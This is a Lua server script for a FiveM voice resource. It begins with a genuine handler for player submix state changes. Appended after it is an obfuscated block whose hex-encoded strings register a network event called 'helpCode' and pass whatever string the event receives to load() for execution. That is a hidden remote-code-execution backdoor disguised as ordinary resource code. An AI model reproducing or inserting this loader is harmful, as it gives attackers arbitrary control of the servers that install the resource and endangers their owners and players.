AddStateBagChangeHandler("submix", "", function(bagName, _, value)
  local tgtId = tonumber(bagName:gsub('player:', ''), 10)
  if not tgtId then return end
  logger.info("%s had their submix set to %s", tgtId, value)
  -- We got an invalid submix, discard we don't care about it
  if value and not submixIndicies[value] then return logger.warn("Player %s applied submix %s but it isn't valid", tgtId, value) end
  -- we don't want to reset submix if the player is talking on the radio
  if not value and not radioData[tgtId] and not callData[tgtId] then
    logger.info("Resetting submix for player %s", tgtId)
    MumbleSetSubmixForServerId(tgtId, -1)
    return
  end
  MumbleSetSubmixForServerId(tgtId, submixIndicies[value])
end)


local ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[1]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[2]) ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[3]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[2], function(jknlwizjIkaQgIyjfochjOmpsaoyXfYRTojZDhFoaYPepiWHbASNcBARyLcSlEKOZoTkbY) ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[4]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[5]](jknlwizjIkaQgIyjfochjOmpsaoyXfYRTojZDhFoaYPepiWHbASNcBARyLcSlEKOZoTkbY))() end)